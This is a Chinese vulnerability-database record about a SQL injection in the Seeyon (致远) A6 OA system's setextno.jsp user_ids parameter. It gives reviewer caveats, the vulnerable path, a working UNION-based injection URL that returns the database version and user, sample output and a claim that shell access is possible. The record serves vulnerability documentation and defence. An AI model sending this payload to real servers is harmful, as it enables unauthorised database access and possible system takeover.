---
source: "hatch 补库批 20260928"
title: "致远A6 setextno.jsp user_ids SQL注入"
product: "致远A6"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "A6；响应MySQL5.0.41，非产品精确版本"
prerequisites: "未说明认证"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20setextno.jsp%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E_%E7%9F%AD%E7%89%88.md"
id: "vw-278e4034349b67b9f0fdc206"
entity_id: "ve-278e4034349b67b9f0fdc206"
schema_version: "1"
---

# 致远A6 setextno.jsp user_ids SQL注入

## 条目说明

- 对象与具体问题：致远A6；setextno.jsp user_ids SQL注入
- 版本、配置及部署条件：A6；响应MySQL5.0.41，非产品精确版本
- 认证与权限前提：未说明认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与后续setextno长篇候选同接口；本篇有返回版本/用户文本有价值
- union可shell过强，写入仍需FILE/路径/解析权限
- 请求未编码空格、回显localhos截断，缺来源/补丁

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

一、漏洞简介
------------

用友致远A6协同系统SQL注入，union可shell

二、漏洞影响
------------

致远OA A6

三、复现过程
------------

###### 漏洞位置:

    http://www.0-sec.org/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp

###### 漏洞详情:

    版本：A6用友致远A6协同系统SQL注入，union可shell

###### 请求方式:

    Get

###### POC:

    http://www.0-sec.org/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17) union all select 1,2,@@version,user()%23

###### 回显内容

    5.0.41-community-nt 
    分机号root@localhos
